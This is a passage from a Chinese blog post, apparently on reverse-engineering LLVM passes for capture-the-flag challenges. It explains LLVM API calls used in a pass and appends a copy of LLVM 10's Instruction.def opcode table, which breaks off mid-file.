<li><p><code>getOpcode()</code>函数用于获取指令的操作符编号，在<code>/usr/include/llvm-xx/llvm/IR/Instruction.def</code></p>
<p>文件中有对应表，<code>56</code>号对应着<code>Call</code>这个操作符：</p>
</li>
<li><p><code>getCalledFunction()</code>函数用于获取被调用的函数名称，即当在一个<code>A</code>函数中调用了<code>B</code>函数，在<code>LLVM IR</code>中，<code>A</code>会通过<code>Call</code>操作符调用<code>B</code>，<code>getCalledFunction()</code>函数就是用于获取此处<code>B</code>函数的名称</p>
</li>
<li><p><code>getOperand(i)</code>是用于获取第<code>i</code>个操作数（在这里就是获取所调用函数的第<code>i</code>个参数），<code>getArgOperand()</code>函数与其用法类似，但只能获取参数，<code>getZExtValue()</code>即<code>get Zero Extended Value</code>，也就是将获取的操作数转为无符号扩展整数</p>
</li>
<li><p>最内层<code>for</code>循环中的<code>instIter-&gt;getNumOperands()-1</code>，这里需要<code>-1</code>是因为对于<code>call</code>和<code>invoke</code>操作符，操作数的数量是实际参数的个数<code>+1</code>（因为将被调用函数本身也当成了操作数）</p>
</li>
<li><p><code>if (isa&lt;ConstantInt&gt;(call_inst-&gt;getOperand(i)))</code>这行语句是通过<code>isa</code>判断当前获取到的操作数是不是立即数（<code>ConstantInt</code>）</p>
</li>
<li><p><code>static RegisterPass&lt;Hello&gt; X(&quot;Hello&quot;, &quot;Hello World Pass&quot;);</code>中的第一个参数就是注册的<code>PASS</code>名称</p>
</li>
<li><p><code>getTerminator()</code>是取基本块中末尾的指令</p>
</li>
<li><p><code>llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; 1</code>判断操作数<code>operand</code>是否为常数。</p>
</li>
<li><p><code>llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;Operand) &amp; 1</code>判断操作数<code>operand</code>是否为函数参数。</p>
</li>
<li><p>自定义函数，类似这种<code>anonymous namespace</code>基本都是出题人自定义的函数，这种是没有去除符号显示出来的。</p>
</li>
</ol>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831091823396.png" alt="image-20230831091823396"></p>

        <h1 id="附录"   >
          <a href="#附录" class="heading-link"><i class="fas fa-link"></i></a><a href="#附录" class="headerlink" title="附录"></a>附录</h1>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v10 版本</span></span><br><span class="line"><span class="comment">//===-- llvm/Instruction.def - File that describes Instructions -*- C++ -*-===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.</span></span><br><span class="line"><span class="comment">// See https://llvm.org/LICENSE.txt for license information.</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file contains descriptions of the various LLVM instructions.  This is</span></span><br><span class="line"><span class="comment">// used as a central place for enumerating the different instructions and</span></span><br><span class="line"><span class="comment">// should eventually be the place to put comments about the instructions.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> NO INCLUDE GUARD DESIRED!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Provide definitions of macros so that users of this file do not have to</span></span><br><span class="line"><span class="comment">// define everything to use it...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_TERM_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_TERM_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_UNARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_UNARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_BINARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_BINARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_CAST_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_CAST_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_USER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_USER_INST(num, opc, Class) HANDLE_OTHER_INST(num, opc, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Terminator Instructions - These instructions are used to terminate a basic</span></span><br><span class="line"><span class="comment">// block of the program.   Every basic block must end with one of these</span></span><br><span class="line"><span class="comment">// instructions for it to be a well formed basic block.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"> FIRST_TERM_INST  ( <span class="number">1</span>)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">1</span>, Ret           , ReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">2</span>, Br            , BranchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">3</span>, Switch        , SwitchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">4</span>, IndirectBr    , IndirectBrInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">5</span>, Invoke        , InvokeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">6</span>, Resume        , ResumeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">7</span>, Unreachable   , UnreachableInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">8</span>, CleanupRet    , CleanupReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">9</span>, CatchRet      , CatchReturnInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">10</span>, CatchSwitch   , CatchSwitchInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">11</span>, CallBr        , CallBrInst) <span class="comment">// A call-site terminator</span></span><br><span class="line">  LAST_TERM_INST  (<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard unary operators...</span></span><br><span class="line"> FIRST_UNARY_INST(<span class="number">12</span>)</span><br><span class="line">HANDLE_UNARY_INST(<span class="number">12</span>, FNeg  , UnaryOperator)</span><br><span class="line">  LAST_UNARY_INST(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard binary operators...</span></span><br><span class="line"> FIRST_BINARY_INST(<span class="number">13</span>)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">13</span>, Add  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">14</span>, FAdd , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">15</span>, Sub  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">16</span>, FSub , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">17</span>, Mul  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">18</span>, FMul , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">19</span>, UDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">20</span>, SDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">21</span>, FDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">22</span>, URem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">23</span>, SRem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">24</span>, FRem , BinaryOperator)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logical operators (integer operands)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">25</span>, Shl  , BinaryOperator) <span class="comment">// Shift left  (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">26</span>, LShr , BinaryOperator) <span class="comment">// Shift right (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">27</span>, AShr , BinaryOperator) <span class="comment">// Shift right (arithmetic)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">28</span>, And  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">29</span>, Or   , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">30</span>, Xor  , BinaryOperator)</span><br><span class="line">  LAST_BINARY_INST(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory operators...</span></span><br><span class="line"> FIRST_MEMORY_INST(<span class="number">31</span>)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">31</span>, Alloca, AllocaInst)  <span class="comment">// Stack management</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">32</span>, Load  , LoadInst  )  <span class="comment">// Memory manipulation instrs</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">33</span>, Store , StoreInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">34</span>, GetElementPtr, GetElementPtrInst)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">35</span>, Fence , FenceInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">36</span>, AtomicCmpXchg , AtomicCmpXchgInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">37</span>, AtomicRMW , AtomicRMWInst )</span><br><span class="line">  LAST_MEMORY_INST(<span class="number">37</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cast operators ...</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> The order matters here because CastInst::isEliminableCastPair</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> (see Instructions.cpp) encodes a table based on this ordering.</span></span><br><span class="line"> FIRST_CAST_INST(<span class="number">38</span>)</span><br><span class="line">HANDLE_CAST_INST(<span class="number">38</span>, Trunc   , TruncInst   )  <span class="comment">// Truncate integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">39</span>, ZExt    , ZExtInst    )  <span class="comment">// Zero extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">40</span>, SExt    , SExtInst    )  <span class="comment">// Sign extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">41</span>, FPToUI  , FPToUIInst  )  <span class="comment">// floating point -&gt; UInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">42</span>, FPToSI  , FPToSIInst  )  <span class="comment">// floating point -&gt; SInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">43</span>, UIToFP  , UIToFPInst  )  <span class="comment">// UInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">44</span>, SIToFP  , SIToFPInst  )  <span class="comment">// SInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">45</span>, FPTrunc , FPTruncInst )  <span class="comment">// Truncate floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">46</span>, FPExt   , FPExtInst   )  <span class="comment">// Extend floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">47</span>, PtrToInt, PtrToIntInst)  <span class="comment">// Pointer -&gt; Integer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">48</span>, IntToPtr, IntToPtrInst)  <span class="comment">// Integer -&gt; Pointer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">49</span>, BitCast , BitCastInst )  <span class="comment">// Type cast</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">50</span>, AddrSpaceCast, AddrSpaceCastInst)  <span class="comment">// addrspace cast</span></span><br><span class="line">  LAST_CAST_INST(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"> FIRST_FUNCLETPAD_INST(<span class="number">51</span>)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">51</span>, CleanupPad, CleanupPadInst)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">52</span>, CatchPad  , CatchPadInst)</span><br><span class="line">  LAST_FUNCLETPAD_INST(<span class="number">52</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Other operators...</span></span><br><span class="line"> FIRST_OTHER_INST(<span class="number">53</span>)</span><br><span class="line">HANDLE_OTHER_INST(<span class="number">53</span>, ICmp   , ICmpInst   )  <span class="comment">// Integer comparison instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">54</span>, FCmp   , FCmpInst   )  <span class="comment">// Floating point comparison instr.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">55</span>, PHI    , PHINode    )  <span class="comment">// PHI node instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">56</span>, Call   , CallInst   )  <span class="comment">// Call a function</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">57</span>, Select , SelectInst )  <span class="comment">// select instruction</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">58</span>, UserOp1, Instruction)  <span class="comment">// May be used internally in a pass</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">59</span>, UserOp2, Instruction)  <span class="comment">// Internal to passes only</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">60</span>, VAArg  , VAArgInst  )  <span class="comment">// vaarg instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">61</span>, ExtractElement, ExtractElementInst)<span class="comment">// extract from vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">62</span>, InsertElement, InsertElementInst)  <span class="comment">// insert into vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">63</span>, ShuffleVector, ShuffleVectorInst)  <span class="comment">// shuffle two vectors.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">64</span>, ExtractValue, ExtractValueInst)<span class="comment">// extract from aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">65</span>, InsertValue, InsertValueInst)  <span class="comment">// insert into aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">66</span>, LandingPad, LandingPadInst)  <span class="comment">// Landing pad instruction.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">67</span>, Freeze, FreezeInst) <span class="comment">// Freeze instruction.</span></span><br><span class="line">  LAST_OTHER_INST(<span class="number">67</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_TERM_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_UNARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_BINARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_MEMORY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_CAST_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_FUNCLETPAD_INST</span></span><br><span class="line"></span><br><span 